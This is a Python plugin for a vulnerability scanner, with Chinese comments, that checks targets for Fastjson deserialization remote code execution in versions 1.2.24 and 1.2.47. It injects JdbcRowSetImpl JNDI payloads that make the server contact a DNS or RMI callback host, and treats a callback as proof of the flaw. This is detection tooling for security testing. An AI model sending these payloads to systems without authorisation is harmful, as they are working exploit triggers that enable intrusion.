#!/usr/bin/env python3
# @Time    : 2020-02-24
# @Author  : caicai
# @File    : poc_fastjson_rce.py
'''
检测原理:在请求体为json数据类型时候，添加一个特定的域名，paylod，如果反连平台接受到域名解析请求，则代表存在漏洞
多次开发，代码有点冗杂
参考: https://github.com/vulhub/vulhub/tree/master/fastjson/1.2.24-rce
'''

from myscan.lib.parse.dictdata_parser import dictdata_parser
from myscan.lib.parse.response_parser import response_parser
from myscan.lib.core.common_reverse import generate_reverse_payloads, query_reverse
from myscan.lib.helper.request import request
from myscan.lib.core.common import get_random_str
from myscan.config import reverse_set
from myscan.lib.core.const import notAcceptedExt



class POC():
    def __init__(self, workdata):
        self.dictdata = workdata.get("dictdata")  # python的dict数据，详情请看docs/开发指南Example dict数据示例
        # scheme的poc不同perfoler和perfile,没有workdata没有data字段,所以无self.url
        self.result = []  # 此result保存dict数据，dict需包含name,url,level,detail字段，detail字段值必须为dict。如下self.result.append代码
        self.name = "Fastjson rce "
        self.vulmsg = "Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。"
        self.level = 2  # 0:Low  1:Medium 2:High

    def verify(self):
        if self.dictdata.get("url").get("extension") in notAcceptedExt:
            return
        if not self.dictdata.get("request").get("content_type") == 4:  # data数据类型为json
            return
        parse = dictdata_parser(self.dictdata)


        #1.2.24 dnslog 测试
        payload = '''
    "%s":{
        "@type":"com.sun.rowset.JdbcRowSetImpl",
        "dataSourceName":"rmi://%s:80/%s",
        "autoCommit":true
    },'''

        domain_ = generate_reverse_payloads(self.dictdata.get("url").get("url").split("?")[0], "dns")[1]  # 获取请求的域名

        payload = payload % (
            get_random_str(6).lower(), domain_, get_random_str(5).lower())  # 格式化payload
        body_withpayload = parse.addpayloadtobody(parse.getrequestbody(), payload.encode(), b"{")  # 在body中插入payload
        if body_withpayload:  # 判断是否成功
            req = parse.generaterequest({"data": body_withpayload, "timeout": 10})
            r = request(**req)
            self.save(r,domain_,"fastjson 1.2.24 dns test")
        #1.2.24 rmi 连接测试
        payload = '''
                    "%s":{
                        "@type":"com.sun.rowset.JdbcRowSetImpl",
                        "dataSourceName":"%s",
                        "autoCommit":true
                    },'''  # 因为是插入到第一个key前面，所以最后一个逗号，双引号也是json标准规定
        rmi_address,hexdata = generate_reverse_payloads(self.dictdata.get("url").get("url").split("?")[0], "rmi") # 获取请求的域名
        for rmi_addr in rmi_address:
            payload_ = payload % (get_random_str(4).lower(), rmi_addr)
            body_withpayload=parse.addpayloadtobody(parse.getrequestbody(),payload_.encode(),b"{")
            if body_withpayload: # 判断是否成功
                req = parse.generaterequest({"data": body_withpayload, "timeout": 10})
                r = request(**req)
                self.save(r, hexdata,"fastjson 1.2.24 rmi test")
        #1.2.47 dns 测试
        payload = '''
            "%s":{
                "@type":"java.lang.Class",
                "val":"com.sun.rowset.JdbcRowSetImpl"
            },
            "%s":{
                "@type":"com.sun.rowset.JdbcRowSetImpl",
                "dataSourceName":"rmi://%s:80/%s",
                "autoCommit":true
            },'''  # 因为是插入到第一个key前面，所以最后一个逗号，双引号也是json标准规定
        domain_ = generate_reverse_payloads(self.dictdata.get("url").get("url").split("?")[0], "dns")[1]  # 获取请求的域名
        payload = payload % (
            get_random_str(6).lower(), get_random_str(6).lower(), domain_, get_random_str(5).lower())  # 格式化payload
        body_withpayload = parse.addpayloadtobody(parse.getrequestbody(), payload.encode(), b"{")  # 在body中插入payload
        if body_withpayload:  # 判断是否成功
            req = parse.generaterequest({"data": body_withpayload, "timeout": 10})
            r = request(**req)
            self.save(r,domain_,"fastjson 1.2.47 dns test")
        #1.2.47 rmi 测试
        payload = '''
                 "%s":{
                     "@type":"java.lang.Class",
                     "val":"com.sun.rowset.JdbcRowSetImpl"
                 },
                 "%s":{
                     "@type":"com.sun.rowset.JdbcRowSetImpl",
                     "dataSourceName":"%s",
                     "autoCommit":true
                 },'''  # 因为是插入到第一个key前面，所以最后一个逗号，双引号也是json标准规定
        rmi_address, hexdata = generate_reverse_payloads(self.dictdata.get("url").get("url").split("?")[0],
                                                         "rmi")  # 获取请求的域名
        for rmi_addr in rmi_address:
            payload_ = payload % (get_random_str(4).lower(),get_random_str(4).lower(), rmi_addr)
            body_withpayload = parse.addpayloadtobody(parse.getrequestbody(), payload_.encode(), b"{")
            if body_withpayload:  # 判断是否成功
                req = parse.generaterequest({"data": body_withpayload, "timeout": 10})
                r = request(**req)
                self.save(r, hexdata, "fastjson 1.2.47 rmi test")
    def save(self,r,hexdata,other=""):
        if r != None:
            res, res_data = query_reverse(hexdata)
            if res:
                parse_ = response_parser(r)
                self.result.append({
                    "name": self.name,
                    "url": self.dictdata.get("url").get("url").split("?")[0],
                    "level": self.level,  # 0:Low  1:Medium 2:High
                    "detail": {
                        "vulmsg": self.vulmsg,
                        "othermsg":other,
                        "request": parse_.getrequestraw(),
                        "response": parse_.getresponseraw(),
                    }
                })
